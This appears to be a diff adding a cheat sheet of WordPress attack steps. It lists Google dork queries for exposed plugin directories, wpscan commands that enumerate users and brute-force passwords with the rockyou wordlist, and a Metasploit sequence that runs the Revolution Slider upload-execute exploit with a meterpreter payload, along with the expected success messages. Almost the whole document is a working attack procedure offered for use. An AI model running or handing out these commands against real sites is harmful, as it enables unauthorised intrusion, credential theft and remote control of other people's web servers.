@@ -1,0 +1,32 @@
+﻿"index of" inurl:wp-content/
+"inurl:"/wp-content/plugins/wp-shopping-cart/"
+"inurl:wp-content/plugins/wp-dbmanager/"
+
+wpscan —url targetwordpressurl.com –enumerate u
+wpscan –url targetwordpressurl.com –wordlist /usr/share/wordlists/rockyou.txt 
+wpscan —url targetwordpressurl.com–wordlist /usr/share/wordlists/rockyou.txt –username admin –threads 2
+search revslider
+use exploit/unix/webapp/wp_revslider_upload_execute
+show options
+set rhost 127.0.0.1/targetsiteurl.com
+set targeturi /wordpress
+set payload php/meterpreter/bind_tcp
+show option
+check/confirm
+exploit
+
+If successful, the following messages will show in terminal:
+
+    “127.0.0.1 (Target’s IP Address Replaced) – Our payload is at /wordpress/wp-content/plugins/revslider/temp/upload“
+    “127.0.0.1 (Target’s IP Address Replaced) – Calling payload…“
+    “Deleted oCDNSJ.php“
+    “Deleted ../revslider.zip“
+
+exploit/unix/webapp/wp_revslider_upload_execute
+msf > use exploit/unix/webapp/wp_revslider_upload_execute
+      msf exploit(wp_revslider_upload_execute) > show targets
+            ...targets...
+      msf exploit(wp_revslider_upload_execute) > set TARGET <target-id>
+      msf exploit(wp_revslider_upload_execute) > show options
+            ...show and set options...
+      msf exploit(wp_revslider_upload_execute) > exploit
